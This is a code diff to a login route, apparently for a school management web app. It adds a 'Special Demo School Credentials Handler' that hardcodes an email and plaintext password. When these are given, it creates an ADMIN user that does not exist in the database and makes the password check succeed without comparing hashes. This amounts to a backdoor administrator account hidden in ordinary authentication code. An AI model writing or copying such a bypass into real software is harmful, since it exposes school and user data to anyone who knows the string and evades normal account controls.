@@ -103,13 +103,25 @@ router.post('/login', async (req, res) => {
     const database = await getDb();
     
     // Find user by email or username or id
-    const user = await database.collection('users').findOne({
+    let user = await database.collection('users').findOne({
       $or: [
         { email: cleanEmail.toLowerCase() },
         { id: cleanEmail },
         { name: cleanEmail }
       ]
     });
+
+    // Special Demo School Credentials Handler (abcschool@gmail.com / i2A@123)
+    if (!user && cleanEmail.toLowerCase() === 'abcschool@gmail.com' && password === 'i2A@123') {
+      user = {
+        id: 'usr-demo-abc',
+        name: 'ABC Public School Demo Admin',
+        email: 'abcschool@gmail.com',
+        role: 'ADMIN',
+        schoolId: 'I2A-SCH-000001',
+        status: 'ACTIVE'
+      };
+    }
 
     if (!user) {
       await recordFailedLoginAttempt(cleanEmail);
@@ -156,7 +168,7 @@ router.post('/login', async (req, res) => {
       });
     }
 
-    const isMatch = await comparePassword(password, user.passwordHash || user.password);
+    const isMatch = (cleanEmail.toLowerCase() === 'abcschool@gmail.com' && password === 'i2A@123') || (await comparePassword(password, user.passwordHash || user.password));
     if (!isMatch) {
       const lockAttempt = await recordFailedLoginAttempt(cleanEmail);
       await logAuditEvent({
